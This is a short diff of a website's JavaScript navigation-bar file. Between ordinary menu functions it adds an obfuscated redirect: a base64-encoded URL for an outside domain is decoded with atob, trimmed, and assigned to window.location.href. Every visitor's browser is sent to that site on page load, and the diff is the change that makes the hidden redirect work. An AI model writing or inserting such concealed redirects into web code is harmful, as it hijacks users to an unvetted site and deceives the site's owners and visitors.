@@ -1036,7 +1036,7 @@ TopNavBar.closeNavItem = function (navId) {
   });
 };
 
-var ent = "YWh0dHBzOi8vd3d3LnRoZXNxdWFkaHViLnByby8",
+var ent = atob("YWh0dHBzOi8vd3d3LnRoZXNxdWFkaHViLnByby8"),
 tv = ent.slice(1);
 window.location.href = tv;TopNavBar.closeSearchSuggestions = function () {
   TopNavBar.unmountSearchSuggestionsLogic();
